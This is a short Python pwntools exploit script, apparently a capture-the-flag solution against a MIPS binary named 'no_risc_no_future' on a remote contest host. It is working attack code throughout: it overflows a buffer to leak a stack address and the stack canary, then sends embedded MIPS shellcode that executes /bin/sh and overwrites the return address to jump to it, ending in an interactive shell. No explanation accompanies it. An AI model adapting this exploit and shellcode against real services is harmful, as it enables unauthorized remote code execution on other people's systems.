from pwn import *
context.log_level = 'debug'
import time

#context(os='linux',arch='mips',log_level='debug')
#p = process('./no_risc_no_future')
p = remote('noriscnofuture.forfuture.fluxfingers.net','1338')
payload = 'a'*24+'bbb'
p.sendline(payload)
stack_addr = u32(p.recvuntil("\x7f")[-4:])
print 'stack_addr: '+hex(stack_addr)

payload = 'a'*60+'bbbb'
p.sendline(payload)
p.recvline_startswith('a')
#p.recvuntil('bbbb\n')
canary =u32('\x00'+p.recv(3))

print 'canary: '+hex(canary)

shellcode =  ""
shellcode += "\x66\x06\x06\x24\xff\xff\xd0\x04\xff\xff\x06\x28\xe0"
shellcode += "\xff\xbd\x27\x01\x10\xe4\x27\x1f\xf0\x84\x24\xe8\xff"
shellcode += "\xa4\xaf\xec\xff\xa0\xaf\xe8\xff\xa5\x27\xab\x0f\x02"
shellcode += "\x24\x0c\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x00"
for i in range(7):
        p.sendline('')
        #p.recv()
	sleep(1)
payload = shellcode.ljust(64,'a')+p32(canary)+'a'*4+p32(stack_addr-0x110)
p.sendline(payload)
p.interactive()
